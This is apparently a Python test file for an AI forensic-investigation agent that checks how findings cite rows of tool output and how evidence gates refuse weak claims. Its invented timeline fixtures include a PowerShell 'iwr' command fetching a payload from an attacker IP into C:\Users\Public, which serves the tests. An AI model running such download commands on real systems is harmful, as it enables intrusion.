    ap = SubmitApplier(_Agent([refusal, {"success": True, "claim_id": "C0050"}]), case, m, _item(log), "join_hit")
    f = {**_FINDING, "entities": [], "bears_on": ["task-0001"]}
    assert "bears_on_question_id" in ap({"findings": [f]}, _run(), False)
    assert "refused (evidence_strength)" in ap({"findings": [{**f, "bears_on": ["task-0001/p1"]}]}, _run(), False)
    assert ap({"findings": [{**f, "bears_on": ["task-0001/p1"]}]}, _run(), False) is None
    assert ap.out["findings"] == 1


def test_a_question_id_resubmitted_with_bears_on_empty_beside_a_repair_keeps_both(env):
    """The reply asks for bears_on empty (never to leave the row
    out, which would shift the positional repair)."""
    case, log, m = env
    refusal = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    ap = SubmitApplier(_Agent([refusal, {"success": True, "claim_id": "C0060"}]), case, m, _item(log), "join_hit")
    neutral = {**_FINDING, "statement": "The host runs a backup agent.", "entities": [], "bears_on": ["task-0001"]}
    reply = ap({"findings": [neutral, _FINDING], "labels": _LABELS}, _run(), False)
    assert "resubmit it with bears_on empty" in reply and "leave it out" not in reply
    assert ap({"findings": [{**neutral, "bears_on": []}, _FINDING]}, _run(), False) is None
    ap.finish()
    assert ap.out["findings"] == 1 and ap.out["observations"] == 1
    assert not [i for i in log.work_items() if i["origin"] == "followup"]
    assert "it serves no question part" in " ".join(ap.out["notes"])


def test_alternating_part_and_question_ids_cannot_escape_refused_twice(env):
    """The send-back happens once per finding, and a record
    refusal after an earlier one is the second."""
    case, log, m = env
    refusal = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    ap = SubmitApplier(_Agent([refusal, refusal, refusal]), case, m, _item(log), "join_hit")
    part, bare = {**_FINDING, "entities": []}, {**_FINDING, "entities": [], "bears_on": ["task-0001"]}
    assert "evidence_strength" in ap({"findings": [part]}, _run(), False)
    assert "bears_on_question_id" in ap({"findings": [bare]}, _run(), False)
    assert ap({"findings": [part]}, _run(), False) is None                  # the second record refusal
    assert [i["source_ref"]["gate"] for i in log.work_items() if i["origin"] == "followup"] == ["evidence_strength"]


# -- a rendered row quoted by its marker and time ---------------------------------------------

_ROWS21 = [{"_n": 1, "TimeCreated": "2031-03-10T14:10:44Z", "UserName": "jane.doe", "EventId": 4720},
           {"_n": 2, "TimeCreated": "2031-03-10T16:11:02+02:00", "UserName": "jane.doe", "EventId": 4732},
           {"_n": 3, "TimeCreated": "2031-03-10T14:20:00.250Z", "UserName": "jane.doe", "EventId": 1},
           {"_n": 4, "TimeCreated": "2031-03-10T14:20:00.900Z", "UserName": "jane.doe", "EventId": 11},
           {"_n": 5, "TimeCreated": "1931000000", "UserName": "svc_backup2", "EventId": 4720}]
_SHOWN21 = "\n".join(["#1 2031-03-10 14:10:44 | jane.doe | 4720", "#2 2031-03-10 14:11:02 | jane.doe | 4732",
                      "#3-#4 x2 2031-03-10 14:20:00 .. 2031-03-10 14:20:00 | jane.doe",
                      "#3 2031-03-10 14:20:00 | jane.doe | 1", "#5 2061-03-10 08:53:20 | svc_backup2 | 4720"])


def _pg1(env, monkeypatch):
    case, log, m = env
    out = {**_OUT, 21: json.dumps({"rows": _ROWS21})}
    monkeypatch.setattr(IM.IncidentMap, "_entry", staticmethod(
        lambda cid: {"type": "tool_call", "stdout_excerpt": out[int(cid)]} if int(cid) in out else None))
    ap = SubmitApplier(_Agent([]), case, m, _item(log), "join_hit")
    return ap, SimpleNamespace(calls=[11, 21], seen={21: _SHOWN21})


def test_a_marker_and_time_quote_names_the_one_row_at_that_time(env, monkeypatch):
    ap, run = _pg1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 21, "quote": "#1 2031-03-10 14:10:44"},
                          {"call_id": 21, "quote": "#2 2031-03-10 14:11:02"}], run)      # Z and an offset saved
    assert [k["row_ref"] for k in kept] == ["21#R1", "21#R2"]


def test_two_rows_at_one_second_name_no_row_and_say_so(env, monkeypatch):
    ap, run = _pg1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 21, "quote": "#3 2031-03-10 14:20:00"}], run)
    assert kept == [] and "names 2 rows of call 21 at that time" in ap.out["dropped"][-1]


def test_a_non_iso_saved_time_still_maps_by_the_quotes_other_cells(env, monkeypatch):
    ap, run = _pg1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 21, "quote": "#5 2061-03-10 08:53:20 | svc_backup2 | 4720"}], run)
    assert [k["row_ref"] for k in kept] == ["21#R5"]


def test_a_collapsed_line_names_no_row_and_the_reason_says_how_to_cite(env, monkeypatch):
    ap, run = _pg1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 21, "quote": "#3-#4 x2 2031-03-10 14:20:00 .. 2031-03-10 14:20:00 | jane.doe"}],
                         run)
    assert kept == [] and "a collapsed line of call 21: it stands for 2 rows" in ap.out["dropped"][-1]
    assert "cite each row the statement rests on" in ap.out["dropped"][-1]


def test_a_time_quoted_against_a_call_that_does_not_hold_it_names_nothing(env, monkeypatch):
    ap, run = _pg1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 11, "quote": "#1 2031-03-10 14:10:44"}], run)
    assert kept == [] and "is not in call 11's output" in ap.out["dropped"][-1]


# -- collapsed lines, clipped "Column | value" quotes, header lines -----------------------------

def _ph3(env, monkeypatch, payload, call_id=31):
    from core.tool_result_view import render_rows_view
    case, log, m = env
    text, note = render_rows_view(payload, 12000, call_id, [], tool="table_table_grep")
    saved = json.dumps(payload)
    monkeypatch.setattr(IM.IncidentMap, "_entry", staticmethod(
        lambda cid: {"type": "tool_call", "stdout_excerpt": saved, **note} if int(cid) == call_id else None))
    ap = SubmitApplier(_Agent([]), case, m, _item(log), "join_hit")
    return ap, SimpleNamespace(calls=[call_id], seen={call_id: text}), json.loads(text)


def test_a_collapsed_line_maps_to_its_member_rows_when_it_verifies(env, monkeypatch):
    from tests.core.test_tool_result_view import _payload, _timeline_rows
    ap, run, view = _ph3(env, monkeypatch, _payload(_timeline_rows()))
    line = next(r for r in view["rows"] if r.startswith("#1-#13 x13 "))
    kept, _q = ap._basis([{"call_id": 31, "quote": line}], run)
    assert len(kept) == 13 and len({k["row_ref"] for k in kept}) == 13
    wrong_count = line.replace("x13", "x12", 1)
    wrong_time = re.sub(r"\.\. \d{4}-\d{2}-\d{2}", ".. 2031-12-31", line, count=1)
    for bad in (wrong_count, wrong_time):
        kept, _q = ap._basis([{"call_id": 31, "quote": bad}], run)
        assert kept == [] and "collapsed line" in ap.out["dropped"][-1]


def test_a_clipped_column_and_value_quote_of_a_one_row_view_maps(env, monkeypatch):
    from tests.core.test_tool_result_view import _payload, _timeline_rows
    row = _timeline_rows()[0]
    ap, run, view = _ph3(env, monkeypatch, _payload([row]))
    assert "same_in_every_returned_row" in view
    quote = "desc | " + row["desc"][:60] + "..."
    kept, _q = ap._basis([{"call_id": 31, "quote": quote}], run)
    assert [k["row_ref"] for k in kept] == ["31#R1"]


def test_a_header_count_line_names_no_row_and_says_how_to_cite_a_count(env, monkeypatch):
    from tests.core.test_tool_result_view import _payload, _timeline_rows
    ap, run, view = _ph3(env, monkeypatch, _payload(_timeline_rows()))
    kept, _q = ap._basis([{"call_id": 31, "quote": '"rows_scanned": 1204331'}], run)
    assert kept == [] and "a line of call 31's header" in ap.out["dropped"][-1]
    assert "cites the rows counted" in ap.out["dropped"][-1]


# -- the refusal an item reads ----------------------------------------------------------------

_CHALLENGED = {"success": False, "gate": "evidence_strength", "detail_gate": "confirmed_requires_supported_evaluate",
               "error": "CONFIRMED tier refused: the reason.evaluate_finding for this finding returned VERDICT: "
                        "CHALLENGED - an explicit SUPPORTED verdict is required. Re-evaluate with stronger evidence "
                        "or downgrade this finding to SUSPECTED/LIKELY.",
               "evaluation": {"verdict": "CHALLENGED", "text": "The rows show svc_kit.exe ran; none shows who ran it."}}


def test_a_challenged_refusal_carries_the_evaluators_reason_and_keeps_it_on_a_repeat(env):
    case, log, m = env
    f = {**_FINDING, "confidence": "confirmed"}
    ap = SubmitApplier(_Agent([_CHALLENGED]), case, m, _item(log), "join_hit")
    reply = ap({"findings": [f]}, _run(), False)
    assert "none shows who ran it" in reply and "reason.evaluate_finding" not in reply
    assert ap({"findings": [f]}, _run(), False) is None             # the same rows: challenged_before, twice
    (follow,) = [i for i in log.work_items() if i["origin"] == "followup"]
    assert follow["source_ref"]["gate"] == "challenged_before" and "none shows who ran it" in follow["source_ref"]["ask"]


def test_no_objection_is_dropped_however_long_the_headline(env):
    case, log, m = env
    two = {"success": False, "gate": "evidence_strength", "detail_gate": "confirmed_and_citation",
           "error": "The citation does not show the value. " + "x" * 900 + " ALSO REFUSED BY 1 MORE GATE(S) - ...",
           "also_refused_by": [{"gate": "universal_from_truncated", "detail_gate": "universal_from_truncated",
                                "error": "The sentence states something about every row, but the view is cut. More."}]}
    ap = SubmitApplier(_Agent([two]), case, m, _item(log), "join_hit")
    reply = ap({"findings": [_FINDING]}, _run(), False)
    assert "also [universal_from_truncated] The sentence states something about every row, but the view is cut." \
        in reply


def _evaluate_gate_text(log) -> str:
    """The evaluate gate's own refusal for a CONFIRMED statement no review
    holds: asked of the gate, never copied."""
    from tools._gates import GateContext, confirmed_requires_supported_evaluate as gate
    ctx = GateContext(description=_FINDING["statement"], confidence="CONFIRMED", tier="CONFIRMED", source="t",
                      linked_call_id=0, tested_hypothesis_id="", log=log, idx=log.index(),
                      window=log.last_n_window(30), reason_window=log.gate_window(30))
    return gate.check(ctx)["error"]


def test_a_missing_evaluation_refusal_names_the_items_paths_not_a_tool_it_lacks(env):
    case, log, m = env
    missing = {"success": False, "gate": "evidence_strength", "detail_gate": "confirmed_requires_supported_evaluate",
               "error": _evaluate_gate_text(log),
               "also_refused_by": [{"gate": "universal_from_truncated", "detail_gate": "universal_from_truncated",
                                    "error": "The view is cut."}]}
    ap = SubmitApplier(_Agent([missing]), case, m, _item(log), "join_hit")
    reply = ap({"findings": [{**_FINDING, "confidence": "confirmed"}]}, _run(), False)
    assert "reason.evaluate_finding" not in reply and "runs when the finding is recorded" in reply
    assert "also [universal_from_truncated] The view is cut." in reply


# -- what makes a finding serve ----------------------------------------------------------------

def _routine(statement, entities, time=None):
    f = {"statement": statement, "confidence": "likely", "host": "CORP-WS02", "bears_on": [], "entities": entities,
         "basis": [{"call_id": 12, "quote": "logon from 203.0.113.7 user jane.doe"}]}
    return {**f, "time": time} if time else f


def test_the_items_own_host_labelled_attacker_does_not_make_a_routine_row_serve(env):
    case, log, m = env
    ap = SubmitApplier(_Agent([{"success": True, "claim_id": "C0070"}, {"success": True, "claim_id": "C0071"}]),
                       case, m, _item(log, "host_pass", "CORP-WS02"), "host_pass")
    ap.arrival_done = True
    host_attacker = {"ref": {"kind": "host", "value": "CORP-WS02"}, "label": "attacker",
                     "basis": [{"call_id": 12, "quote": "logon from 203.0.113.7"}]}
    routine = _routine("The print spooler restarted on CORP-WS02.", [{"kind": "host", "value": "CORP-WS02"},
                                                                     {"kind": "file", "value": "spoolsv.exe"}])
    ap({"findings": [routine], "labels": [host_attacker]}, _run(), False)
    assert ap.out["findings"] == 0 and ap.out["observations"] == 1
    other_host = _routine("CORP-WS02 was reached from CORP-WS01.", [{"kind": "host", "value": "CORP-WS01"}])
    ap({"findings": [other_host], "labels": [{**host_attacker, "ref": {"kind": "host", "value": "CORP-WS01"}}]},
       _run(), False)
    kit = _routine("svc_kit.exe was written on CORP-WS02.", [{"kind": "file", "value": "svc_kit.exe"}])
    ap({"findings": [kit], "labels": [{**host_attacker, "ref": {"kind": "file", "value": "svc_kit.exe"}}]},
       _run(), False)
    assert ap.out["findings"] == 2                       # another attacker host, an attacker file: they serve


def test_an_account_taken_over_serves_only_from_its_takeover_on(env):
    case, log, m = env
    agent = _Agent([{"success": True, "claim_id": "C0080"}])
    ap = SubmitApplier(agent, case, m, _item(log, "host_pass", "CORP-WS02"), "host_pass")
    ap.arrival_done = True
    taken = {"ref": {"kind": "account", "value": "jane.doe"}, "label": "attacker",
             "attacker_from": "2031-03-10 13:58:00", "basis": [{"call_id": 12, "quote": "user jane.doe"}]}
    acct = [{"kind": "account", "value": "jane.doe"}]
    before = _routine("jane.doe logged on interactively.", acct, time="2031-03-10 13:31:49")
    untimed = _routine("jane.doe uses this workstation.", acct)
    after = _routine("jane.doe logged on from 203.0.113.7.", acct, time="2031-03-10 13:58:02")
    ap({"findings": [before, untimed, after], "labels": [taken]}, _run(), False)
    assert ap.out["findings"] == 1 and ap.out["observations"] == 2
    assert agent.records[0][1]["description"] == after["statement"]


def test_six_co_objections_keep_their_names_and_a_lone_headline_keeps_its_repair_sentence(env):
    """The room is shared before joining, nothing is cut after; a
    single objection's headline stays whole when it fits."""
    from agent.frontier import _REFUSAL_CHARS, _item_refusal
    six = {"success": False, "gate": "evidence_strength", "detail_gate": "confidence_and_citation",
           "error": "The cited call does not show the value. " + "y" * 700 + ". Add each value or remove the claim.",
           "also_refused_by": [{"gate": f"gate_{i}", "detail_gate": f"gate_{i}",
                                "error": f"Objection {i} names its problem here. " + "z" * 400} for i in range(6)]}
    text = _item_refusal(six)
    assert len(text) <= _REFUSAL_CHARS and all(f"also [gate_{i}]" in text for i in range(6))
    lone = {"success": False, "gate": "universal_from_truncated", "detail_gate": "universal_from_truncated",
            "error": "The sentence states something about every row, but the view is cut. Or re-record now what "
                     "was actually seen, for example: the rows shown hold no remote logon."}
    assert "Or re-record now what was actually seen" in _item_refusal(lone)



def test_an_attacker_from_that_is_no_time_makes_no_finding_serve(env):
    case, log, m = env
    ap = SubmitApplier(_Agent([]), case, m, _item(log, "host_pass", "CORP-WS02"), "host_pass")
    ap.arrival_done = True
    garbled = {"ref": {"kind": "account", "value": "jane.doe"}, "label": "attacker", "attacker_from": "203.0.113.7",
               "basis": [{"call_id": 12, "quote": "user jane.doe"}]}
    f = _routine("jane.doe logged on from 203.0.113.7.", [{"kind": "account", "value": "jane.doe"}],
                 time="2031-03-10 13:58:02")
    ap({"findings": [f], "labels": [garbled]}, _run(), False)
    assert ap.out["findings"] == 0 and ap.out["observations"] == 1


def test_a_challenged_refusal_with_four_co_objections_names_every_gate_and_keeps_the_reason():
    from agent.frontier import _REFUSAL_CHARS, _item_refusal
    d = {"success": False, "gate": "evidence_strength", "detail_gate": "confirmed_requires_supported_evaluate",
         "error": "CONFIRMED tier refused: VERDICT: CHALLENGED.",
         "evaluation": {"verdict": "CHALLENGED", "text": "The rows show the logon; none shows the account's owner. "
                                                         + "w" * 500},
         "also_refused_by": [{"gate": f"g{i}", "detail_gate": f"g{i}", "error": f"Objection {i} here. " + "v" * 600}
                             for i in range(4)]}
    text = _item_refusal(d)
    assert len(text) <= _REFUSAL_CHARS and all(f"also [g{i}]" in text for i in range(4))
    assert "none shows the account's owner" in text


def test_a_reused_evaluation_carries_its_reason_into_the_reply_and_the_challenged_memory(env):
    # the gate's refusal on an evaluation already in the trace has the
    # same "evaluation" shape an auto-evaluation gives, marked reused.
    case, log, m = env
    reused = {"success": False, "gate": "confirmed_requires_supported_evaluate",
              "evaluate_verdict": "CHALLENGED",
              "error": "CONFIRMED tier refused: the reason.evaluate_finding for this finding returned VERDICT: "
                       "CHALLENGED - an explicit SUPPORTED verdict is required.",
              "evaluation": {"verdict": "CHALLENGED", "call_id": 7, "reused": True,
                             "text": "the rows show the start, not who started it."}}
    f = {**_FINDING, "confidence": "confirmed"}
    ap = SubmitApplier(_Agent([reused]), case, m, _item(log), "join_hit")
    reply = ap({"findings": [f]}, _run(), False)
    assert "not who started it" in reply
    ((_key, judged),) = list(ap.challenged.items())
    assert judged["text"] == "the rows show the start, not who started it."


# -- a quote of a numbered view resolves on the side the model read ---------------------------
#
# The real shape of a timeline view (invented content): source and sourcetype vary, so the view joins
# them into one cell; a long description is clipped by the table tool (tools.tabular._clip_cell) and
# again by the view; a matched low-value column is shown as "col~value"; rows share a second.

_L2T = ["date", "time", "timezone", "MACB", "source", "sourcetype", "type", "user", "host", "short", "desc",
        "version", "filename", "inode", "notes", "format", "extra"]
_EVTX_LOG = "OS:/mnt/ws02/C/Windows/System32/winevt/Logs/Security.evtx"
_PAD = "'-'  " * 70


def _l2t(n, t, src, stype, typ, desc, user="-", extra="-", fname=_EVTX_LOG):
    return {"_sheet": "-", "_row": n, "_matched_columns": ["desc", "extra"],
            **dict(zip(_L2T, ["03/10/2031", t, "UTC", "...B", src, stype, typ, user, "CORP-WS02", desc[:40], desc,
                              "2", fname, "-", "-", "winevtx", extra]))}


_RQ1_ROWS = [
    _l2t(501, "13:58:02", "EVT", "WinEVTX", "Creation Time",
         "[4624 / 0x1210] Provider identifier: {00000000-1111-2222-3333-444444444444} Source Name: "
         "Microsoft-Windows-Security-Auditing Strings: [" + _PAD + "'jane.doe'  'CORP'  '0x1a2b3c'  '3'  "
         "'Kerberos'  '203.0.113.7'  '49712'] Computer Name: corp-ws02.example.com",
         extra="event_version: 2; ip: 203.0.113.7"),
    _l2t(502, "13:58:02", "EVT", "WinEVTX", "Creation Time",
         "[4672 / 0x1240] Provider identifier: {00000000-1111-2222-3333-444444444444} Source Name: "
         "Microsoft-Windows-Security-Auditing Strings: [" + _PAD + "'jane.doe'  'CORP'  'SeDebugPrivilege'  "
         "'203.0.113.7'] Computer Name: corp-ws02.example.com", extra="event_version: 0; ip: 203.0.113.7"),
    _l2t(503, "14:02:10", "LOG", "PowerShell Transcript Event", "Start Time",
         "executed by host application powershell -c iwr http://203.0.113.7/k.bin -OutFile C:\\Users\\Public\\u.ps1",
         user="jane.doe", fname="OS:/mnt/ws02/C/Users/jane.doe/Documents/PowerShell_transcript.CORP-WS02.txt"),
    _l2t(504, "14:10:00", "FILE", "Bodyfile", "Last Access Time",
         "c:\\Users\\Public\\u.ps1 from 203.0.113.7 Owner identifier: 0", user="qa7", fname="OS:/mnt/ws02/C/$MFT"),
    _l2t(505, "14:10:00", "FILE", "Bodyfile", "Last Access Time",
         "c:\\Users\\Public\\u.ps1 from 203.0.113.7 Owner identifier: 0", user="qa8", fname="OS:/mnt/ws02/C/$MFT"),
]
# Page 2 of the search: its own numbering from #1 (one row alone would go into the shared line).
_RQ1_PAGE2 = [_l2t(506, "14:20:00", "LOG", "WinPrefetch", "Last Time Executed",
                   "Prefetch [K.EXE] was executed - run count 1 path hints: \\USERS\\PUBLIC\\K.EXE from 203.0.113.7",
                   fname="OS:/mnt/ws02/C/Windows/Prefetch/K.EXE-0A1B2C3D.pf"),
              _l2t(507, "14:25:03", "EVT", "WinEVTX", "Creation Time",
                   "[5156 / 0x1444] The Windows Filtering Platform has permitted a connection to 203.0.113.7")]


def _rq1(env, monkeypatch, pages=None, log=None):
    """Each call a page of the timeline search, saved as the table tool
    saves it (cells clipped) and shown as the view renders it."""
    from core.tool_result_view import render_rows_view
    from tools.tabular import _clip_row
    case, trace, m = env
    rx = re.compile(r"203\.0\.113\.7")
    pages = pages or {61: _RQ1_ROWS}
    entries, seen = {}, {}
    for cid, rows in pages.items():
        hits = [{"_sheet": r["_sheet"], "_row": r["_row"], "_matched_columns": r["_matched_columns"],
                 **_clip_row({k: v for k, v in r.items() if not k.startswith("_")}, None, rx, r["_matched_columns"])}
                for r in rows]
        payload = {"success": True, "path": "evidence/timelines/corp-ws02-supertimeline.csv",
                   "pattern": r"203\.0\.113\.7", "hits": hits, "hit_count": len(hits), "max_hits": 50,
                   "hit_cap_reached": False, "rows_scanned": 90210, "scanned_rows": 90210, "scan_capped": False}
        text, note = render_rows_view({"_atlas_call_id": cid, **payload}, 12000, cid, [], tool="table_table_grep")
        entries[cid] = {"type": "tool_call", "stdout_excerpt": json.dumps(payload), **note}
        seen[cid] = text
    monkeypatch.setattr(IM.IncidentMap, "_entry", staticmethod(lambda cid: entries.get(int(cid))))
    agent = _Agent([])
    if log is not None:
        agent._log = log.append
    ap = SubmitApplier(agent, case, m, _item(trace), "join_hit")
    return ap, SimpleNamespace(calls=list(pages), seen=seen), {c: json.loads(t)["rows"] for c, t in seen.items()}


def test_an_exact_copy_of_a_view_line_with_its_joined_and_col_cells_maps_to_its_row(env, monkeypatch):
    ap, run, rows = _rq1(env, monkeypatch)
    line = rows[61][2]
    assert "| LOG/PowerShell Transcript Event |" in line and "extra~" in rows[61][0] and "\u2026" in rows[61][0]
    kept, _q = ap._basis([{"call_id": 61, "quote": line.split(" ", 1)[1]},                      # without its marker
                          {"call_id": 61, "quote": "2031-03-10 13:58:02 | EVT/WinEVTX | Creation Time | - | "
                                                   "[4624 / 0x1210]"},
                          {"call_id": 61, "quote": "2031-03-10 13:58:02 | extra~event_version: 0"}], run)
    assert [k["row_ref"] for k in kept] == ["61#R3", "61#R1", "61#R2"]
    # the shown line is kept as the quote, never the model's words
    assert kept[0]["quote"] == line and not ap.out["dropped"]


def test_a_quote_that_leaves_out_the_middle_of_a_clipped_row_maps_by_its_pieces(env, monkeypatch):
    ap, run, rows = _rq1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 61, "quote": "2031-03-10 13:58:02 | [4624 / 0x1210] ... 'jane.doe'  'CORP'  "
                                                   "'0x1a2b3c'"},
                          {"call_id": 61, "quote": "#2 2031-03-10 13:58:02 | [4672 / 0x1240] \u2026 'SeDebugPrivilege'"}],
                         run)
    assert [k["row_ref"] for k in kept] == ["61#R1", "61#R2"]


def test_a_marker_resolves_only_with_a_piece_of_its_own_line(env, monkeypatch):
    ap, run, rows = _rq1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 61, "quote": "#3"},                                       # a marker alone
                          {"call_id": 61, "quote": "#3 FILE/Bodyfile"},                         # pieces of #4 and #5
                          {"call_id": 61, "quote": "#4 EVT/WinEVTX"},                           # another line's
                          {"call_id": 61, "quote": "#1 EVT"}], run)                             # every line could
    assert kept == []
    dropped = ap.out["dropped"]
    assert "a row marker alone names no row of call 61" in dropped[0]
    assert "row #3 of call 61 reads" in dropped[1] and "is in #4, #5" in dropped[1]
    assert "row #4 of call 61 reads" in dropped[2] and "is in #1, #2" in dropped[2]
    assert "names no one row of call 61" in dropped[3]
    kept, _q = ap._basis([{"call_id": 61, "quote": "#4 2031-03-10 14:10:00"}], run)            # marker and time
    assert [k["row_ref"] for k in kept] == ["61#R4"]


def test_rows_at_one_second_resolve_only_through_a_piece_that_tells_them_apart(env, monkeypatch):
    ap, run, rows = _rq1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 61, "quote": "2031-03-10 14:10:00 | FILE/Bodyfile | Last Access Time"},
                          {"call_id": 61, "quote": "2031-03-10 13:58:02 | EVT/WinEVTX"}], run)
    assert kept == []
    assert "is in 2 rows of call 61 (#4, #5)" in ap.out["dropped"][0]
    assert "is in 2 rows of call 61 (#1, #2)" in ap.out["dropped"][1]
    kept, _q = ap._basis([{"call_id": 61, "quote": "2031-03-10 14:10:00 | FILE/Bodyfile | Last Access Time | qa8"}],
                         run)
    assert [k["row_ref"] for k in kept] == ["61#R5"]


def test_a_windows_path_quote_maps_as_the_round_or_the_digest_showed_it(env, monkeypatch):
    ap, run, rows = _rq1(env, monkeypatch)
    assert "C:\\\\Users\\\\Public\\\\u.ps1" in run.seen[61]                  # the round's text: escaped
    assert "C:\\Users\\Public\\u.ps1" in rows[61][2]                         # the digest's line: decoded
    kept, _q = ap._basis([{"call_id": 61, "quote": "14:02:10 | LOG/PowerShell Transcript Event | Start Time | jane.doe | "
                                                   "executed by host application powershell -c iwr "
                                                   "http://203.0.113.7/k.bin -OutFile C:\\\\Users\\\\Public\\\\u.ps1"},
                          {"call_id": 61, "quote": "-OutFile C:\\Users\\Public\\u.ps1"}], run)
    assert [k["row_ref"] for k in kept] == ["61#R3", "61#R3"]


def test_a_marker_cited_from_another_calls_page_is_re_cited_or_refused_by_name(env, monkeypatch):
    log = []
    ap, run, rows = _rq1(env, monkeypatch, pages={61: _RQ1_ROWS, 62: _RQ1_PAGE2}, log=log)
    quote = "#1 2031-03-10 14:20:00 | LOG/WinPrefetch | Last Time Executed"
    kept, _q = ap._basis([{"call_id": 61, "quote": quote}], run)                # page 2's #1, cited as page 1
    assert [(k["call_id"], k["row_ref"], k["recited_from"]) for k in kept] == [(62, "62#R1", 61)]
    assert log[-1]["event"] == "frontier_basis" and log[-1]["via"] == "recited" and log[-1]["cited_as"] == [62]
    # a quoted marker that another call's line holding the quote does not carry is refused, as in one call
    kept, _q = ap._basis([{"call_id": 61, "quote": "#1 2031-03-10 14:25:03 | [5156 / 0x1444]"}], run)
    assert kept == [] and "row #1 of call 61 reads" in ap.out["dropped"][-1]
    assert "is in call 62 #2: cite the call and row the quote is in" in ap.out["dropped"][-1]
    kept, _q = ap._basis([{"call_id": 61, "quote": "2031-03-10 14:25:03 | [5156 / 0x1444]"}], run)  # no marker
    assert [(k["call_id"], k["row_ref"]) for k in kept] == [(62, "62#R2")]
    ap, run, rows = _rq1(env, monkeypatch, pages={61: _RQ1_ROWS, 62: _RQ1_PAGE2, 63: _RQ1_PAGE2})
    kept, _q = ap._basis([{"call_id": 61, "quote": quote}], run)
    assert kept == [] and "it is in call 62 #1, call 63 #1: cite the call and row meant" in ap.out["dropped"][-1]


def test_a_quote_no_view_holds_and_an_unnumbered_output_keep_the_saved_side_path(env, monkeypatch):
    ap, run, rows = _rq1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 61, "quote": '"rows_scanned": 90210'},                     # the header
                          {"call_id": 61, "quote": "2031-03-10 14:30:00 | LOG/Nothing"}], run)
    assert kept == [] and "a line of call 61's header" in ap.out["dropped"][0]
    assert "is not in call 61's output" in ap.out["dropped"][1]
    # an output without a view record (a plugin's JSON list): the plain path
    case, trace, m = env
    _OUT[64] = json.dumps([{"PID": 4242, "ImageFileName": "svc_kit.exe", "CreateTime": "2031-03-10T14:02:00+00:00"}],
                          indent=2)
    monkeypatch.setattr(IM.IncidentMap, "_entry", staticmethod(
        lambda cid: {"type": "tool_call", "stdout_excerpt": _OUT[int(cid)]} if int(cid) in _OUT else None))
    ap2 = SubmitApplier(_Agent([]), case, m, _item(trace), "join_hit")
    kept, _q = ap2._basis([{"call_id": 64, "quote": '"ImageFileName": "svc_kit.exe"'}],
                          SimpleNamespace(calls=[64], seen={64: _OUT[64]}))
    assert [k["row_ref"] for k in kept] == ["64#R1"]
    _OUT.pop(64)


def test_every_basis_entry_writes_one_record_with_its_whole_quote(env, monkeypatch):
    log = []
    ap, run, rows = _rq1(env, monkeypatch, log=log)
    long_quote = rows[61][0]
    ap._basis([{"call_id": 61, "quote": long_quote}, {"call_id": 61, "quote": "a line nobody was shown"},
               {"call_id": 99, "quote": "x"}], run)
    recs = [r for r in log if r.get("event") == "frontier_basis"]
    assert len(recs) == 3 and recs[0]["quote"] == long_quote and len(long_quote) > 60
    assert recs[0]["kept"] == ["61#R1"] and recs[0]["via"] == "marker" and recs[0]["why"] == ""
    assert recs[1]["kept"] == [] and "is not in call 61's output" in recs[1]["why"]
    assert "neither this item's nor named by it" in recs[2]["why"]


# -- a row is its line and the cells every row shares; a header line is called a header ---------

def _rq5_row(n, t, eid, desc, **extra):
    return {"_sheet": "-", "_row": n, "TimeCreated": f"2031-03-10 {t}", "Computer": "CORP-WS02", "Channel": "Security",
            "EventId": eid, "MapDescription": desc, **extra}


_RQ5_ONE = _rq5_row(77, "14:02:10", 4688, "Process creation", UserName="CORP\\jane.doe",
                    PayloadData2="CommandLine: C:\\Users\\Public\\svc_kit.exe -k")


def _rq5(env, monkeypatch, pages, extra_entries=None):
    from core.tool_result_view import render_rows_view
    case, trace, m = env
    entries, seen = dict(extra_entries or {}), {}
    for cid, rows in pages.items():
        payload = {"success": True, "path": "exports/corp-ws02-security.csv", "rows": rows, "returned_rows": len(rows)}
        text, note = render_rows_view({"_atlas_call_id": cid, **payload}, 12000, cid, tool="table_table_query")
        entries[cid] = {"type": "tool_call", "cmd": "<py>:table_table_query", "stdout_excerpt": json.dumps(payload),
                        **note}
        seen[cid] = text
    for cid, e in (extra_entries or {}).items():
        seen[cid] = json.dumps({"_atlas_call_id": cid, **json.loads(e["stdout_excerpt"])}, indent=2)
    monkeypatch.setattr(IM.IncidentMap, "_entry", staticmethod(lambda cid: entries.get(int(cid))))
    ap = SubmitApplier(_Agent([]), case, m, _item(trace), "join_hit")
    return ap, SimpleNamespace(calls=list(entries), seen=seen), {c: json.loads(t) for c, t in seen.items()}


def test_a_one_row_views_quote_of_its_shared_cells_names_its_row(env, monkeypatch):
    ap, run, views = _rq5(env, monkeypatch, {12: [_RQ5_ONE]})
    assert views[12]["rows"] == ["#1 2031-03-10 14:02:10"] and views[12]["same_in_every_returned_row"]["EventId"] == "4688"
    quote = ("#1 2031-03-10 14:02:10 | EventId 4688 | Process creation | UserName: ... | PayloadData2: CommandLine: "
             "C:\\Users\\Public\\svc_kit.exe -k")
    kept, _q = ap._basis([{"call_id": 12, "quote": quote},
                          {"call_id": 12, "quote": quote.split(" ", 1)[1]},                    # without its marker
                          {"call_id": 12, "quote": "#1 2031-03-10 14:02:10"}], run)            # marker and time only
    assert [k["row_ref"] for k in kept] == ["12#R1"] * 3 and not ap.out["dropped"]
    # the line and only the shared cells the quote named
    assert kept[0]["quote"] == ("#1 2031-03-10 14:02:10 | EventId: 4688 | MapDescription: Process creation | "
                                "PayloadData2: CommandLine: C:\\Users\\Public\\svc_kit.exe -k")


def test_names_without_values_and_a_bare_time_name_no_row_of_a_one_row_view(env, monkeypatch):
    ap, run, views = _rq5(env, monkeypatch, {12: [_RQ5_ONE]})
    kept, _q = ap._basis([{"call_id": 12, "quote": "#1 | UserName | PayloadData2"},
                          {"call_id": 12, "quote": "#1 2031-03-10 14:02:10 | UserName: C"},
                          {"call_id": 12, "quote": "2031-03-10 14:02:10"}], run)
    assert kept == []
    assert "names no value of call 12: a column name is no evidence" in ap.out["dropped"][0]
    assert "names no value of the row of call 12" in ap.out["dropped"][1]
